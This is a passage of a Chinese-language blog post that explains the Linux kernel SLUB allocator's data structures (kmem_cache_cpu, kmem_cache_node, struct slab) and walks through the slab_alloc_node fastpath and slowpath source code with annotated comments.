class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> random; <span class="comment">//用作free pointer加密的异或值</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN_GENERIC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h3><p>kmem_cache对于每个cpu有一个kmem_cache_cpu结构,用于快速处理分配释放请求.<br>三个关键结构.<br>freelist: 无锁的空闲链表,快速分配.<br>slab: 当前cpu正在使用的slab<br>partial: 一些未在使用且部分空闲的slab</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="type">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">};</span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_tid;</span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line"><span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h3><p>对于slub来说,关注partial链表即可.可以看作是kmem_cache_cpu与buddy system的中间层.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The slab lists for all objects.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> {</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="type">raw_spinlock_t</span> list_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h3><p>向buddy system一次请求的连续页面称作slab.<br>在linux kernel的代码中, struct slab,struct folio,struct page本质上其实是一个东西(之前slab是直接作为联合体嵌入在struct page中).由于一个slab可能是多个连续页面,该结构保存在仅第一个页面中.<br>所以可以直接从虚拟地址转化到对应的slab.</p><p>下列是需要关注的结构；<br>slab_cache : 指向对应的kmem_cache.也就实现了虚拟地址转换到kmem_cache.<br>slab_list: 组织kmem_cache_node中双向链表的结构.<br>next: 组织kmeme_cache_cpu中partial单向链表的结构.<br>slabs: 当前slab之后的slab数量,用于kmeme_cache_cpu中partial单向链表的计数.<br>freelist; 记录slab中空闲对象的链表<br>inuse: 当前slab正在使用的对象数<br>objects: 当前slab包含的对象数<br>frozen: 当前slab是否为冻结状态.(解释一下,冻结就是分给特定的cpu了,位于kmem_cache_cpu-&gt;slab或partial)<br>rcu_head: 用于rcu回调的.</p><p>inuse,objects,frozen整体用counters来表示(联合体),便于整体更新.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Reuses the bits in struct page */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">};</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">};</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">};</span><br><span class="line">};</span><br><span class="line">};</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> system_has_freelist_aba</span></span><br><span class="line"><span class="type">freelist_aba_t</span> freelist_counter;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br><span class="line">};</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">};</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">"Unexpected slab allocator configured"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><h3 id="slab-alloc-node"><a href="#slab-alloc-node" class="headerlink" title="slab_alloc_node"></a>slab_alloc_node</h3><p>内核中通过slab allocator进行内存分配的接口最终都会调用到slab_alloc_node进行实际的内存分配.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401291653009.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401291655418.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 如果无锁的空闲链表可以使用则通过FASTPATH进行分配,</span></span><br><span class="line"><span class="comment">* 否则通过__slab_alloc进行SLOWPATH</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> __fastpath_inline <span class="type">void</span> *<span class="title function_">slab_alloc_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> list_lru *lru,</span></span><br><span class="line"><span class="params"><span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node, <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">size_t</span> orig_size)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">bool</span> init = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">object = kfence_alloc(s, orig_size, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(object))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);</span><br><span class="line"></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line">init = slab_want_init_on_alloc(gfpflags, s);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When init equals 'true', like for kzalloc() family, only</span></span><br><span class="line"><span class="comment"> * @orig_size bytes might be zeroed instead of s-&gt;object_size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab_post_alloc_hook(s, objcg, gfpflags, <span class="number">1</span>, &amp;object, init, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实际的处理逻辑在__slab_alloc_node.FASTPATH的处理是直接取kmem_cache_cpu-&gt;freelist的第一个对象返回.当然进入FASTPATH的前提是要c-&gt;freelist&amp;&amp;c-&gt;slab.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *__slab_alloc_node(<span class="keyword">struct</span> kmem_cache *s,</span><br><span class="line"><span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node, <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">size_t</span> orig_size)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;</span><br><span class="line"><span class="type">void</span> *object;</span><br><span class="line"></span><br><span class="line">redo:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must read kmem_cache cpu data via this cpu ptr. Preemption is</span></span><br><span class="line"><span class="comment"> * enabled. We may switch back and forth between cpus while</span></span><br><span class="line"><span class="comment"> * reading from one cpu area. That does not matter as long</span></span><br><span class="line"><span class="comment"> * as we end up on the original cpu again when doing the cmpxchg.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We must guarantee that tid and kmem_cache_cpu are retrieved on the</span></span><br><span class="line"><span class="comment"> * same cpu. We read first the kmem_cache_cpu pointer and use it to read</span></span><br><span class="line"><span class="comment"> * the tid. If we are preempted and switched to another cpu between the</span></span><br><span class="line"><span class="comment"> * two reads, it's OK as the two are still associated with the same cpu</span></span><br><span class="line"><span class="comment"> * and cmpxchg later will validate the cpu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">tid = READ_ONCE(c-&gt;tid);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Irqless object alloc/free algorithm used here depends on sequence</span></span><br><span class="line"><span class="comment"> * of fetching cpu_slab's data. tid should be fetched before anything</span></span><br><span class="line"><span class="comment"> * on c to guarantee that object and slab associated with previous tid</span></span><br><span class="line"><span class="comment"> * won't be used with current tid. If we fetch tid first, object and</span></span><br><span class="line"><span class="comment"> * slab could be one associated with next tid and our alloc/free</span></span><br><span class="line"><span class="comment"> * request will be failed. In this case, we will retry. So, no problem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The transaction ids are globally unique per cpu and per operation on</span></span><br><span class="line"><span class="comment"> * a per cpu queue. Thus they can be guarantee that the cmpxchg_double</span></span><br><span class="line"><span class="comment"> * occurs on the right processor and that there was no operation on the</span></span><br><span class="line"><span class="comment"> * linked list in between.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">slab = c-&gt;slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||</span><br><span class="line">    unlikely(!object || !slab || !node_match(slab, node))) {</span><br><span class="line"><span class="comment">//SLOWPATH</span></span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">//FASTPATH,直接取kmem_cache_cpu-&gt;freelist的第一个对象</span></span><br><span class="line"><span class="type">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The cmpxchg will only match if there was no additional</span></span><br><span class="line"><span class="comment"> * operation and if we are on the right processor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The cmpxchg does the following atomically (without lock</span></span><br><span class="line"><span class="comment"> * semantics!)</span></span><br><span class="line"><span class="comment"> * 1. Relocate first pointer to the current per cpu area.</span></span><br><span class="line"><span class="comment"> * 2. Verify that tid and freelist have not been changed</span></span><br><span class="line"><span class="comment"> * 3. If they were not changed replace tid and freelist</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Since this is without lock semantics the protection is only</span></span><br><span class="line"><span class="comment"> * against code executing on this cpu *not* from access by</span></span><br><span class="line"><span class="comment"> * other cpus.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!__update_cpu_freelist_fast(s, object, next_object, tid))) {</span><br><span class="line">note_cmpxchg_failure(<span class="string">"slab_alloc"</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">}</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>函数___slab_alloc是SLOWPATH的主要处理逻辑,由于其比较复杂且本来就是模块化的,这里逐块进行分析.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slow path. 当无锁的空闲链表为空时或进行调试时使用.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 若有新的对象已经被释放到常规的空闲链表中了,处理仍旧非常快.</span></span><br><span class="line"><span class="comment"> * 只需要将常规空闲链表作为无锁的空闲链表并清空常规的空闲链表.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果这不起作用,我们回退到partial链表.</span></span><br><span class="line"><span class="comment"> * 我们取走partial链表中的slab的freelist中的</span></span><br><span class="line"><span class="comment"> * 第一个对象作为本次分配的对象返回,然后将空闲链表中</span></span><br><span class="line"><span class="comment"> * 剩下的对象移动到无锁的空闲链表中.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 如果我们不能从partial slab链表中获取到新的slab,</span></span><br><span class="line"><span class="comment"> * 则需要分配一个新的slab.这是最慢的路径因为它需要调用</span></span><br><span class="line"><span class="comment"> * 页极分配器并初始化一个新的slab.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * __slab_alloc这一版本是当我们知道抢占已经被禁用时使用的.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *___slab_alloc(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node,</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="keyword">struct</span> kmem_cache_cpu *c, <span class="type">unsigned</span> <span class="type">int</span> orig_size)</span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br></pre></td></tr></tbody></table></figure><h4 id="reread-slab"><a href="#reread-slab" class="headerlink" title="reread_slab"></a>reread_slab</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取c-&gt;slab到局部变量中,便于访问修改</span></span><br><span class="line">reread_slab:</span><br><span class="line"></span><br><span class="line">slab = READ_ONCE(c-&gt;slab);</span><br><span class="line"><span class="keyword">if</span> (!slab) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment"> * ignore the node constraint</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//该kmem_cache_cpu没有正在使用的slab,跳转到new_slab</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">     !node_isset(node, slab_nodes)))</span><br><span class="line">node = NUMA_NO_NODE;</span><br><span class="line"><span class="keyword">goto</span> new_slab;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="redo"><a href="#redo" class="headerlink" title="redo"></a>redo</h4><p>主要是进行一些检测来将处理逻辑分发到不同处理模块</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 